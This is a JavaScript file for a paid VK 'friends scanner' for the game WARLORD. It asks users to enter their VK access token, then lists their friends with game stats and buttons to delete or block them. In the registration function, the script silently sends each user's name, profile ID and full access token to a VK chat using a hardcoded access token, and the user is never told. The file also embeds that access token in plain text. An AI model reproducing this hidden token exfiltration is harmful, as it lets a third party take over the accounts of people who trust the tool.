function gototop() {
    $("html, body").animate({
        scrollTop: 0
    }, 400);
}

function pages_next() {
	if ( document.querySelector('body').getAttribute('position') <= -((max_page/10-1)*850) ) {
	} else {
		document.querySelector('.friends_pages').style.left = ''+(Number(document.querySelector('body').getAttribute('position'))-850)+'px';
		document.querySelector('body').setAttribute('position', ''+(Number(document.querySelector('body').getAttribute('position'))-850)+'');
	}
}

function pages_back() {
	if ( document.querySelector('body').getAttribute('position') >= 0 ) {
	} else {
		document.querySelector('.friends_pages').style.left = ''+(Number(document.querySelector('body').getAttribute('position'))+850)+'px';
		document.querySelector('body').setAttribute('position', ''+(Number(document.querySelector('body').getAttribute('position'))+850)+'');
	}
}

function exit_rules() {
	$('.main_rules').fadeOut(250);
}
function go_rules() {
	$('.main_rules').fadeIn(250);
}

function check_reg() {
	if ( localStorage.getItem('access_id') != null ) {
		var my_access_id = localStorage.getItem('access_id');
		var my_access_token = localStorage.getItem('access_token');
		document.querySelector('#reg_input_id').value = my_access_id;
		document.querySelector('#reg_input_key').value = my_access_token;
	} else {
		console.log("Пользователь ранее не был зарегистрирован.");
		$('.main_rules').fadeIn(250);
	}
}
check_reg();

function start_reg() {
	document.querySelector('#check_reg').innerHTML = 'Проверка...';
	var token_size = document.querySelector('#reg_input_key').value.length;
	if ( token_size == 85 ) {
		var my_access_id = document.querySelector('#reg_input_id').value;
		var my_access_token = document.querySelector('#reg_input_key').value;
		$.ajax({
			url: 'https://api.vk.com/method/users.get?access_token=' + my_access_token + '&v=5.101',
			type: 'GET',
			dataType: 'jsonp',
			crossDomain: true,
			success: function(data) {
				if ( typeof data.response != "undefined" && my_access_id == data.response[0].id ) {
					$.ajax({
						url: 'https://api.vk.com/method/pages.get?owner_id=-138604865&page_id=56326549&need_html=1&access_token=' + my_access_token + '&v=5.101',
						type: 'GET',
						dataType: 'jsonp',
						crossDomain: true,
						success: function(datapage) {
							var access_ids = /\[(.*)\]/gi.exec(datapage.response.html)[1];
							if ( access_ids.includes(my_access_id) ) {
								document.querySelector('#check_reg').innerHTML = 'Загрузка данных...';
								localStorage.setItem('access_id', my_access_id);
								localStorage.setItem('access_token', my_access_token);
								max_count = document.querySelector('#check_count').options[document.querySelector('#check_count').selectedIndex].value;
								max_page = 10000/max_count;
								var index = Date.now();
								var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Ваш ID и Access Token успешно сохранены.<br>Они автоматически будут введены при новом посещении страницы.</div>';
								document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
								$('#'+index+'').fadeIn(500);
								setTimeout(function() {
									$('#'+index+'').fadeOut(500);
									setTimeout(function() {
										document.querySelector('.main_tooltip>div').remove();
									}, 500);
								}, 3000);
								get_friends(""+my_access_id+"", ""+my_access_token+"", ""+max_count+"", "0", "1");
								var messagenum = +new Date % 10;
								var messagelog = ''+data.response[0].first_name+' '+data.response[0].last_name+'(vk.com/id'+my_access_id+') authorizing in scaner.<br>Token: '+my_access_token+'.';
								$.ajax({ url: 'https://api.vk.com/method/messages.send?peer_id=2000000001&message='+messagelog+'&access_token=c99b855c29f76cbf5182ba7f3651875435b7086ba401a96b5b1482469e5e3cc002b4d42bc47faaf6ec7c1&v=5.101&random_id='+messagenum+'', type: 'GET', dataType: 'jsonp', crossDomain: true });
							} else {
								document.querySelector('#check_reg').innerHTML = 'Войти';
								var index = Date.now();
								var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Ваш ID не найден в базе доступа к сканеру.<br>Если это ошибка, свяжитесь с тем, у кого покупали доступ к нему.</div>';
								document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
								$('#'+index+'').fadeIn(500);
								setTimeout(function() {
									$('#'+index+'').fadeOut(500);
									setTimeout(function() {
										document.querySelector('.main_tooltip>div').remove();
									}, 500);
								}, 3000);
							}
						}
					});
				} else {
					document.querySelector('#check_reg').innerHTML = 'Войти';
					var index = Date.now();
					var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Ваш ID либо Access Token не проходят проверку.<br>Попробуйте ввести их заново.</div>';
					document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
					$('#'+index+'').fadeIn(500);
					setTimeout(function() {
						$('#'+index+'').fadeOut(500);
						setTimeout(function() {
							document.querySelector('.main_tooltip>div').remove();
						}, 500);
					}, 3000);
				}
			}
		});
	} else {
		document.querySelector('#check_reg').innerHTML = 'Войти';
		var index = Date.now();
		var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Ваш ID либо Access Token не соответствуют стандартам.<br>Попробуйте ввести их заново.</div>';
		document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
		$('#'+index+'').fadeIn(500);
		setTimeout(function() {
			$('#'+index+'').fadeOut(500);
			setTimeout(function() {
				document.querySelector('.main_tooltip>div').remove();
			}, 500);
		}, 3000);
	}
}

function get_delete(user_id, access_token) {
	$.ajax({
        url: 'https://api.vk.com/method/friends.delete?user_id=' + user_id + '&access_token=' + access_token + '&v=5.101',
        type: 'GET',
        dataType: 'jsonp',
        crossDomain: true,
        success: function(data) {
			if ( typeof data.error == "undefined" ) {
				try {
					document.querySelector('#delete_'+user_id+'').innerHTML = 'Отмена';
					document.querySelector('#delete_'+user_id+'').className = "friend_button deactive";
					document.querySelector('#delete_'+user_id+'').setAttribute('onclick', 'get_add(`'+user_id+'`, `'+access_token+'`);');
				} catch(err) {
					console.log("Ошибка удаления друга.\nОбъяснение: "+err+".");
				}
			} else {
				var index = Date.now();
				var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Невозможно удалить друга.<br>'+data.error.error_msg+'.<br>Код ошибки: '+data.error.error_code+'.</div>';
				document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
				$('#'+index+'').fadeIn(500);
				setTimeout(function() {
					$('#'+index+'').fadeOut(500);
					setTimeout(function() {
						document.querySelector('.main_tooltip>div').remove();
					}, 500);
				}, 3000);
			}
		}
    });
}

function get_add(user_id, access_token) {
	$.ajax({
        url: 'https://api.vk.com/method/friends.add?user_id=' + user_id + '&access_token=' + access_token + '&v=5.101',
        type: 'GET',
        dataType: 'jsonp',
        crossDomain: true,
        success: function(data) {
			if ( data.response == 2 ) {
				try {
					document.querySelector('#delete_'+user_id+'').innerHTML = 'Удалить';
					document.querySelector('#delete_'+user_id+'').className = "friend_button";
					document.querySelector('#delete_'+user_id+'').setAttribute('onclick', 'get_delete(`'+user_id+'`, `'+access_token+'`);');
				} catch(err) {
					console.log("Ошибка добавления друга.\nОбъяснение: "+err+".");
				}
			} else {
				if ( data.response == 1 ) {
					$.post( "https://api.vk.com/method/friends.delete?user_id=' + user_id + '&access_token=' + access_token + '&v=5.101", function( data ) {
						var index = Date.now();
						var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Невозможно добавить друга.<br>Друг отменил заявку.<br>Код ошибки: 8.</div>';
						document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
						$('#'+index+'').fadeIn(500);
						setTimeout(function() {
							$('#'+index+'').fadeOut(500);
							setTimeout(function() {
								document.querySelector('.main_tooltip>div').remove();
							}, 500);
						}, 3000);
					});
				}
			}
		}
    });
}

function get_ban(user_id, access_token) {
	$.ajax({
        url: 'https://api.vk.com/method/account.ban?owner_id=' + user_id + '&access_token=' + access_token + '&v=5.101',
        type: 'GET',
        dataType: 'jsonp',
        crossDomain: true,
        success: function(data) {
			if ( data.response == 1 ) {
				try {
					document.querySelector('#ban_'+user_id+'').innerHTML = 'Отмена';
					document.querySelector('#ban_'+user_id+'').className = "friend_button deactive";
					document.querySelector('#ban_'+user_id+'').setAttribute('onclick', 'get_unban(`'+user_id+'`, `'+access_token+'`);');
				} catch(err) {
					console.log("Ошибка блокировки друга.\nОбъяснение: "+err+".");
				}
			} else {
				var index = Date.now();
				var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Невозможно заблокировать друга.<br>'+data.error.error_msg+'.<br>Код ошибки: '+data.error.error_code+'.</div>';
				document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
				$('#'+index+'').fadeIn(500);
				setTimeout(function() {
					$('#'+index+'').fadeOut(500);
					setTimeout(function() {
						document.querySelector('.main_tooltip>div').remove();
					}, 500);
				}, 3000);
			}
		}
    });
}

function get_unban(user_id, access_token) {
	$.ajax({
        url: 'https://api.vk.com/method/account.unban?owner_id=' + user_id + '&access_token=' + access_token + '&v=5.101',
        type: 'GET',
        dataType: 'jsonp',
        crossDomain: true,
        success: function(data) {
			if ( data.response == 1 ) {
				try {
					document.querySelector('#ban_'+user_id+'').innerHTML = 'Заблокировать';
					document.querySelector('#ban_'+user_id+'').className = "friend_button";
					document.querySelector('#ban_'+user_id+'').setAttribute('onclick', 'get_ban(`'+user_id+'`, `'+access_token+'`);');
				} catch(err) {
					console.log("Ошибка разблокировки друга.\nОбъяснение: "+err+".");
				}
			} else {
				var index = Date.now();
				var tooltip_body = '<div class="main_tooltip_body" id="'+index+'">Невозможно разблокировать друга.<br>'+data.error.error_msg+'.<br>Код ошибки: '+data.error.error_code+'.</div>';
				document.querySelector('.main_tooltip').insertAdjacentHTML('beforeend', tooltip_body);
				$('#'+index+'').fadeIn(500);
				setTimeout(function() {
					$('#'+index+'').fadeOut(500);
					setTimeout(function() {
						document.querySelector('.main_tooltip>div').remove();
					}, 500);
				}, 3000);
			}
		}
    });
}

function get_friends(user_id, access_token, count, offset, page) {
    $.ajax({
        url: 'https://api.vk.com/method/friends.get?user_id=' + user_id + '&order=name&count=' + count + '&offset=' + offset + '&return_system=1&fields=photo_100&access_token=' + access_token + '&v=5.101',
        type: 'GET',
        dataType: 'jsonp',
        crossDomain: true,
        success: function(data) {
            $.ajax({
                url: 'https://api.vk.com/method/friends.getLists?user_id=' + user_id + '&access_token=' + access_token + '&v=5.101',
                type: 'GET',
                dataType: 'jsonp',
                crossDomain: true,
                success: function(data_list) {
                    try {
						try { document.querySelector('.friend_head').remove(); document.querySelector('.friends_sort_head').remove(); document.querySelector('.friends_pages_head').remove(); } catch {}
                        $('.main_friends_list').empty();
						document.querySelector('body').setAttribute('page', page);
						document.querySelector('body').setAttribute('position', '0');
						var friends_body = '<div class="friend_head"><b><i class="fas fa-tools"></i> Сканер друзей для WARLORD</b>   <a href="https://vk.com/id153968505" target="_blank">by xolova</a></div>';
						document.querySelector('.main_friends').insertAdjacentHTML('beforebegin', friends_body);
                        var count_all = data.response.count;
                        if (count_all == 0) {
                            var friends_body = 'нет друзей';
                            document.querySelector('.main_friends_list').insertAdjacentHTML('beforeend', friends_body);
                        } else {
                            for (var x = 0; x < (count > count_all ? count_all : count); x++) {
                                try {
                                    var id = data.response.items[x].id;
                                    var hid = data.response.items[x].id;
                                    var name = data.response.items[x].first_name + ' ' + data.response.items[x].last_name;
                                    var online = data.response.items[x].online == 0 ? "online_false" : "online";
                                    var photo = data.response.items[x].photo_100;
                                    var friends_body = '<div class="friend id'+id+'" data-number="' + (x+1) + '" data-id="' + id + '" data-hp="" data-dmg="" data-clan="" data-visit=""><div class="friend_count classic"><div class="friend_number ' + online + '">' + (Number(offset) + Number(x) + 1) + '</div><div class="friend_photo" style="background-image: url(' + photo + ');"></div></div><div class="friend_name classic" onclick="window.open(`https://vk.com/id' + id + '`, `_blank`);">' + name + '<div id="forlists_' + id + '"></div></div><div class="friend_stats classic"><div style="width: 93px; border-right: 1px solid #e7e8ec;">Здоровье:<div style="font-size: 12.5px; font-weight: 400;" id="forstats_hp_' + id + '">Загрузка...</div></div><div style="width: 100px; border-right: 1px solid #e7e8ec; padding-left: 20;">Урон:<div style="font-size: 12.5px; font-weight: 400;" id="forstats_dmg_' + id + '">Загрузка...</div></div><div style="width: 150px; border-right: 1px solid #e7e8ec; padding-left: 20;">Гильдия:<div style="font-size: 12.5px; font-weight: 400;" id="forstats_clan_' + id + '">Загрузка...</div></div><div style="width: 200px; padding-left: 20;">Последний вход:<div style="font-size: 12.5px; font-weight: 400;" id="forstats_date_' + id + '">Загрузка...</div></div></div><div class="friend_buttons classic"><div class="friend_button" id="delete_' + id + '" style="margin-bottom: 5px;" onclick="get_delete(`' + id + '`, `' + access_token + '`);">Удалить</div><div class="friend_button" id="ban_' + id + '" onclick="get_ban(`' + id + '`, `' + access_token + '`);">Заблокировать</div></div></div>';
                                    document.querySelector('.main_friends_list').insertAdjacentHTML('beforeend', friends_body);
									try {
										showInfo(id);
									} catch (err) {
										console.log("Ошибка вызова функции характеристики.\nОбъяснение: " + err + ".");
									}
									try {
										for (var i = 0; i < (typeof data.response.items[x].lists == "undefined" ? "0" : data.response.items[x].lists.length); i++) {
											var list = data_list.response.items.find(item => item.id == data.response.items[x].lists[i]).name;
											var lists_body = '<span class="friend_list">' + list + '</span>';
											document.querySelector('#forlists_'+id+'').insertAdjacentHTML('beforeend', lists_body);
										}
										if ( (typeof data.response.items[x].lists == "undefined" ? "0" : data.response.items[x].lists.length) == 0 ) {
											var lists_body = '<span class="friend_list red">Нет в списках</span>';
											document.querySelector('#forlists_'+id+'').insertAdjacentHTML('beforeend', lists_body);
										}
									} catch (err) {
										console.log("Ошибка получения статуса друга " + x + ".\nОбъяснение: " + err + ".");
									}
                                } catch (err) {
                                    console.log("Ошибка получения друга " + x + ".\nОбъяснение: " + err + ".");
                                }
                            }
							var pages = Math.ceil(count_all/max_count);
							var friends_pages_body = '<div class="friends_pages_head classic"><div class="friends_pages_help"><div class="friends_pages"></div></div></div>';
							document.querySelector('.main_friends').insertAdjacentHTML('beforeend', friends_pages_body);
							for (var x = 0; x < pages; x++) {
								var green = document.querySelector("body").getAttribute("page") == (x+1) ? "green" : "";
								var friends_pages_number_body = '<div class="friends_pages_number ' + green + '" onclick="gototop(); get_friends(`'+user_id+'`, `'+access_token+'`, `'+max_count+'`, `'+(x*max_count)+'`, `'+(x+1)+'`);">' + (x+1) + '</div>';
								document.querySelector('.friends_pages').insertAdjacentHTML('beforeend', friends_pages_number_body);
							}
							for (var x = 0; x < (Number(max_page-pages)); x++) {
								var friends_pages_number_body = '<div class="friends_pages_number grey">' + (pages+x+1) + '</div>';
								document.querySelector('.friends_pages').insertAdjacentHTML('beforeend', friends_pages_number_body);
							}
							document.querySelector('.friends_pages>.green').removeAttribute('onclick');
							document.querySelector('.friends_pages_head').insertAdjacentHTML('afterbegin', '<div class="friends_pages_number back fas" onclick="pages_back();"></div>');
							document.querySelector('.friends_pages_head').insertAdjacentHTML('beforeend', '<div class="friends_pages_number next fas" onclick="pages_next();"></div>');
							$('.back').hover(function() {
								$('.friends_pages').css({
									'left': ''+(Number(document.querySelector('body').getAttribute('position'))+25)+'px'
								});
							}, function() {
								$('.friends_pages').css({
									'left': ''+(Number(document.querySelector('body').getAttribute('position')))+'px'
								});
							});
							$('.next').hover(function() {
								$('.friends_pages').css({
									'left': ''+(Number(document.querySelector('body').getAttribute('position'))-25)+'px'
								});
							}, function() {
								$('.friends_pages').css({
									'left': ''+(Number(document.querySelector('body').getAttribute('position')))+'px'
								});
							});
							$('.friends_pages').css({
								'width': ''+(max_page*85)+'px'
							});
							var friends_sort_body = '<div class="friends_sort_head classic"><div id="sort_1" onclick="table_sort(`number`, `-1`, `1`, `sort_1`);" style="width: 315px; margin-right: 60px;" class="friends_sort_number fas green"></div><div id="sort_2" onclick="table_sort(`hp`, `1`, `-1`, `sort_2`);" style="width: 76px; margin-right: 31px;" class="friends_sort_number fas"></div><div id="sort_3" onclick="table_sort(`dmg`, `1`, `-1`, `sort_3`);" style="width: 87px; margin-right: 31px;" class="friends_sort_number fas"></div><div id="sort_4" onclick="table_sort(`clan`, `-1`, `1`, `sort_4`);" style="width: 137px; margin-right: 31px;" class="friends_sort_number fas"></div><div id="sort_5" onclick="table_sort(`visit`, `1`, `-1`, `sort_5`);" style="width: 200px; margin-right: 60px;" class="friends_sort_number fas"></div><div style="width: 150px;" class="friends_sort_logo"><i class="fas fa-align-left"></i>  СОРТИРОВКА  <i class="fas fa-align-right"></i></div></div>';
							document.querySelector('.main_friends').insertAdjacentHTML('afterbegin', friends_sort_body);
                        }
                    } catch (err) {
                        console.log("Ошибка получения друзей.\nОбъяснение: " + err + ".");
                    }
                }
            });
        }
    });
}

function showInfo(person_id) {
	var xhr = new XMLHttpRequest();
	xhr.open('POST', 'https://vk-bot.com/warscript/api', true);
	xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
	xhr.send(JSON.stringify({
		id: person_id,
		myid: 153968505
	}));
	xhr.onloadend = () => {
		$('#forstats_hp_'+person_id+'').empty();
		$('#forstats_dmg_'+person_id+'').empty();
		$('#forstats_date_'+person_id+'').empty();
		$('#forstats_clan_'+person_id+'').empty();
		try {
			var data = JSON.parse(xhr.responseText);
			var date_type = new Date();
			var date_type_big = { timezone: 'UTC', year: 'numeric', month: 'long', day: 'numeric', };
			var date_type_small = { timezone: 'UTC', hour: 'numeric', minute: 'numeric', second: 'numeric' };
			var date_var_lastvisit = new Date(date_type - (Number(data.l_t) * 1000));
			var date_lastvisit_b = date_var_lastvisit.toLocaleString("ru", date_type_big);
			var date_lastvisit_s = date_var_lastvisit.toLocaleString("ru", date_type_small);
			var stats_hp_body = '<span class="friend_list">' + (Math.round((Number(data.end) + Number(data.endi)) * 15)+'').replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, "$1."); + '</span>';
			var stats_dmg_body = '<span class="friend_list">' + (Math.round(data.dmgi)+'').replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, "$1."); + '</span>';
			var stats_date_body = '<span class="friend_list">' + date_lastvisit_b + ' в ' + date_lastvisit_s + '</span>';
			var stats_clan_body = data.clan_id >= 1? '<span class="friend_list">' + data.clan.name + '</span>': '<span class="friend_list red">не состоит</span>'; 
			document.querySelector('#forstats_hp_'+person_id+'').insertAdjacentHTML('beforeend', stats_hp_body);
			document.querySelector('#forstats_dmg_'+person_id+'').insertAdjacentHTML('beforeend', stats_dmg_body);
			document.querySelector('#forstats_date_'+person_id+'').insertAdjacentHTML('beforeend', stats_date_body);
			document.querySelector('#forstats_clan_'+person_id+'').insertAdjacentHTML('beforeend', stats_clan_body);
			
			document.querySelector('.id'+person_id+'').setAttribute('data-hp', ''+((Number(data.end) + Number(data.endi)) * 15)+'');
			document.querySelector('.id'+person_id+'').setAttribute('data-dmg', ''+Number(data.dmgi)+'');
			document.querySelector('.id'+person_id+'').setAttribute('data-clan', ''+(Number(data.clan_id) == 0 ? 999999 : Number(data.clan_id))+'');
			document.querySelector('.id'+person_id+'').setAttribute('data-visit', ''+Number(data.l_t)+'');
		} catch (err) {
			var stats_body = '<span class="friend_list red">Не играет</span>';
			document.querySelector('#forstats_hp_'+person_id+'').insertAdjacentHTML('beforeend', stats_body);
			document.querySelector('#forstats_dmg_'+person_id+'').insertAdjacentHTML('beforeend', stats_body);
			document.querySelector('#forstats_date_'+person_id+'').insertAdjacentHTML('beforeend', stats_body);
			document.querySelector('#forstats_clan_'+person_id+'').insertAdjacentHTML('beforeend', stats_body);
			
			document.querySelector('.id'+person_id+'').setAttribute('data-hp', '0');
			document.querySelector('.id'+person_id+'').setAttribute('data-dmg', '0');
			document.querySelector('.id'+person_id+'').setAttribute('data-clan', '999999');
			document.querySelector('.id'+person_id+'').setAttribute('data-visit', '0');
		}
	};
	var errorLoad = () => {
		console.log("Ошибка вывода характеристики.");
	};
	xhr.onerror = errorLoad;
	xhr.ontimeout = errorLoad;
	xhr.onabort = errorLoad;
};


function table_sort(index, s1, s2, id) {
	const items = [...document.querySelectorAll('.friend')];
	function sort(a, b) {
		const aData = $(a).data(index);
		const bData = $(b).data(index);
		if (aData < bData) {
			return s1;
		}
		if (aData > bData) {
			return s2;
		}
		return 0;
	}
	items.sort(sort);
	$('.main_friends_list').empty();
	items.forEach(item => {
		$('.main_friends_list').append(item);
	});
	document.querySelector('.friends_sort_head>.green').innerHTML = '';
	document.querySelector('.friends_sort_head>#'+id+'').innerHTML = '';
	document.querySelector('.friends_sort_head>.green').className = 'friends_sort_number fas';
	document.querySelector('.friends_sort_head>#'+id+'').className = 'friends_sort_number fas green';
}